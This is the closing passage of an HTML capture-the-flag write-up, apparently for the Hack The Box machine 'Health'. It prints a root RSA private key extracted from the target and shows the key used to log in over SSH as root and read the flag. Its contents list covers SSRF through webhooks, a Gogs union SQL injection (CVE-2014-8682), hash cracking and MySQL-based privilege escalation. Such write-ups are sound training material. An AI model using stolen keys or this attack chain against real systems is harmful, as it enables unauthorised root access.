KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n&quot;)&#39;</span><span class="p">|</span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;\&#39;</span>
+tr:<span class="w"> </span>warning:<span class="w"> </span>an<span class="w"> </span>unescaped<span class="w"> </span>backslash<span class="w"> </span>at<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span>string<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>portable
+-----BEGIN<span class="w"> </span>RSA<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
+KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
+IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
+KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
+7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
+W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
+NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
+t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
+C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
+hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
+..........................SNIP..................................
+sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
+fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
+0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
+zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
+rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
+N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
+SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
+++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
+UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
+vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
+6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
+QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
+-----END<span class="w"> </span>RSA<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>root@health.htb<span class="w"> </span>-i<span class="w"> </span>root.pem
+Welcome<span class="w"> </span>to<span class="w"> </span>Ubuntu<span class="w"> </span><span class="m">18</span>.04.6<span class="w"> </span>LTS<span class="w"> </span><span class="o">(</span>GNU/Linux<span class="w"> </span><span class="m">4</span>.15.0-191-generic<span class="w"> </span>x86_64<span class="o">)</span>
+
+<span class="w"> </span>*<span class="w"> </span>Documentation:<span class="w">  </span>https://help.ubuntu.com
+<span class="w"> </span>*<span class="w"> </span>Management:<span class="w">     </span>https://landscape.canonical.com
+<span class="w"> </span>*<span class="w"> </span>Support:<span class="w">        </span>https://ubuntu.com/advantage
+
+<span class="w">  </span>System<span class="w"> </span>information<span class="w"> </span>as<span class="w"> </span>of<span class="w"> </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">22</span>:07:45<span class="w"> </span>UTC<span class="w"> </span><span class="m">2022</span>
+
+<span class="w">  </span>System<span class="w"> </span>load:<span class="w">  </span><span class="m">0</span>.05<span class="w">              </span>Processes:<span class="w">           </span><span class="m">184</span>
+<span class="w">  </span>Usage<span class="w"> </span>of<span class="w"> </span>/:<span class="w">   </span><span class="m">69</span>.3%<span class="w"> </span>of<span class="w"> </span><span class="m">3</span>.84GB<span class="w">   </span>Users<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>:<span class="w">     </span><span class="m">2</span>
+<span class="w">  </span>Memory<span class="w"> </span>usage:<span class="w"> </span><span class="m">20</span>%<span class="w">               </span>IP<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>eth0:<span class="w"> </span><span class="m">10</span>.10.11.176
+<span class="w">  </span>Swap<span class="w"> </span>usage:<span class="w">   </span><span class="m">0</span>%
+
+
+<span class="m">0</span><span class="w"> </span>updates<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>applied<span class="w"> </span>immediately.
+
+Failed<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>https://changelogs.ubuntu.com/meta-release-lts.<span class="w"> </span>Check<span class="w"> </span>your<span class="w"> </span>Internet<span class="w"> </span>connection<span class="w"> </span>or<span class="w"> </span>proxy<span class="w"> </span>settings
+
+
+Last<span class="w"> </span>login:<span class="w"> </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">19</span>:49:24<span class="w"> </span><span class="m">2022</span><span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.10.14.166
+root@health:~#<span class="w"> </span><span class="nb">pwd</span>
+/root
+root@health:~#<span class="w"> </span>wc<span class="w"> </span>-c<span class="w"> </span>root.txt
+<span class="m">33</span><span class="w"> </span>root.txt
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../jupiter/jupiter.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Jupiter</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../format/format.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Format</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Health</a><ul>
+<li><a class="reference internal" href="#enumeration">Enumeration</a></li>
+<li><a class="reference internal" href="#leveraging-the-webhooks-to-do-some-ssrf">Leveraging the Webhooks to do some SSRF</a></li>
+<li><a class="reference internal" href="#redirect-the-ssrf">302 Redirect the SSRF</a></li>
+<li><a class="reference internal" href="#installing-gogs-locally-and-exploring-the-source">Installing Gogs locally and exploring the source</a></li>
+<li><a class="reference internal" href="#cracking-our-own-pbkdf2-hmac-sha256">Cracking our own PBKDF2-HMAC-SHA256</a></li>
+<li><a class="reference internal" href="#manual-union-sqli-cve-2014-8682">Manual Union SQLi - CVE-2014-8682</a></li>
+<li><a class="reference internal" href="#cracking-the-real-hash">Cracking the real hash</a></li>
+<li><a class="reference internal" href="#privesc-manipulating-the-mysql-db">Privesc manipulating the  MySQL db</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
